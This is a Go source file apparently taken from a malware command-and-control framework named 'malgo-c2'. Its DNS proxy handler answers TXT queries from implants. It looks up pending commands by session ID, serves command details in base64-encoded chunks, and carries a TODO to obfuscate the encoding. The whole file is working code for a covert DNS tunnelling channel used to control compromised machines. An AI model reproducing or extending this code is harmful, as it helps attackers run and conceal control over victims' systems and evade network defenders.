package dnsproxy

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	gateway "github.com/VipWW/malgo-c2/services/common/service"
	"github.com/miekg/dns"
	"strconv"
	"strings"
)

// handleTXT handles command queries. Command queries look like this:
// Either:
// - <SessionID>.<domain>
// - <a>.<offset>.<CommandID>.<domain>
func (h *Handler) handleTXT(msg *dns.Msg, r *dns.Msg) error {
	dataFromMessage := h.removeDomain(r.Question[0].Name)
	if dataFromMessage == "" {
		return fmt.Errorf("invalid domain")
	}

	splitData := strings.Split(dataFromMessage, ".")

	var result string

	switch len(splitData) {
	case 1:
		// <SessionID>.<domain>
		grpcResult, err := h.grpcClient.CommandInfo(context.Background(), &gateway.CommandInfoRequest{
			SessionId: splitData[0],
		})
		if err != nil {
			if strings.Contains(err.Error(), "no rows in result set") {
				// Session duplicate, it's ok
			} else {
				return err
			}
		}

		res, _ := json.Marshal(grpcResult)
		result = string(res)
	case 3:
		// <offset>.<CommandID>.<domain>
		offset, err := strconv.Atoi(splitData[1])
		if err != nil {
			return err
		}
		grpcResult, err := h.grpcClient.CommandDetailsChunk(context.Background(), &gateway.CommandDetailsChunkRequest{
			CommandId: splitData[2],
			Offset:    int64(offset),
			Length:    maxDNSMessageSize,
		})
		if err != nil {
			return err
		}
		res, _ := json.Marshal(grpcResult)

		// write base64 encoded data to the result
		result = base64.StdEncoding.EncodeToString(res)
	}

	//TODO: obfuscate the result. Switch from base64 to something else

	msg.Answer = append(msg.Answer, &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    1,
		},
		Txt: []string{result},
	})

	return nil
}
